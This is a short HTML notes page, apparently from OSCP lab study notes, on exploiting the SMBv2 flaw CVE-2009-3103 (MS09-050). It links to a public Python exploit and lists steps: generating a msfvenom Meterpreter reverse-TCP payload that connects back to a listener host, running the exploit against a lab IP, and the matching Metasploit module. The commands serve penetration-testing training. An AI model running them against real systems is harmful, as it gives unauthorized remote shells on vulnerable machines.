<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>CVE-2009-3103 / MS09-50 - RCE</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1>#Port 139/SMB - CVE-2009-3103 / MS09-50 - Remote Code Execution</h1></strong><br />Nmap will find this with vuln scripts.<br /><br />• Exploitdb - <br />   ◇ Github version by author - <a href="https://github.com/ohnozzy/Exploit/blob/master/MS09_050.py">https://github.com/ohnozzy/Exploit/blob/master/MS09_050.py</a><br /><br /><strong>Examples</strong><br />• OSCP 10.11.1.145 - HELPDESK<br /><br /><strong><h3>## ohnozzy Python Script</h3></strong><br />• <a href="https://www.exploit-db.com/exploits/40280">https://www.exploit-db.com/exploits/40280</a> - Exploit DB<br />• <a href="https://github.com/ohnozzy/Exploit/blob/master/MS09_050.py">https://github.com/ohnozzy/Exploit/blob/master/MS09_050.py</a> - GitHub version by author<br /><br />1. Install <code>smb</code> library<br /><code>pip install pysmb</code><br /><br />2. Create msfvenom payload &amp; replace the shellcode<br /><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.42 LPORT=9001 EXITFUNC=thread -f python -v shell</code><br /><br />3. Set up meterpreter listener<br /><br />4. Run exploit<br /><code>python ms09-50.py 10.11.1.145</code><strong><br /></strong><br /><strong><h3>## Metasploit</h3></strong><br /><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code><strong><br /></strong></div>
</body>
</html>
